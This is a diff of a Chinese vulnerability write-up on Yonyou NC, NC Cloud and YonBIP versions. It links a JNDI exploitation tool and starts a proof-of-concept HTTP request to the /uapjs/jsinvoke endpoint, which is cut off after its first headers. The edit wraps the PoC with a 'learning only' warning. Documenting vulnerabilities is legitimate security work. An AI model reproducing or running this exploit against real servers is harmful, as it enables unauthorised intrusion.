@@ -24,15 +24,18 @@ NC63、NC633、NC65
 NC Cloud1903、NC Cloud1909
 NC Cloud2005、NC Cloud2105、NC Cloud2111
 YonBIP 高级版 2207
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
-JNDI：https://github.com/WhiteHSBG/JNDIExploit
+JNDI：https://github.com/WhiteHSBG/&#74;NDIExploit
 
 exp：
+</code></pre>
 
-```
+</details>
 POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
 Host: your-ip
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
